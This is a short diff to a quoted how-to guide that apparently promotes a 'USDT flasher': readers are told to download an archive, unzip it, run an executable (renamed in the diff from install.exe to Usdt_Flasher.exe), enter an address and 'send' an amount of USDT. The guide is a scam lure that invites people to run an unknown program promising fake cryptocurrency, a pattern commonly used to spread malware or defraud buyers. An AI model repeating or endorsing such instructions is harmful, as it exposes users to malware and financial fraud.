@@ -10,7 +10,7 @@
 > Guide:
 > 1. Download the archive from the button above
 > 2. Unzip to any folder
-> 3. Run exe file (install.exe)
+> 3. Run exe file (Usdt_Flasher.exe)
 > 4. Enter your adress
 > 5. Select amount of USDT
 > 6. Click "SEND"
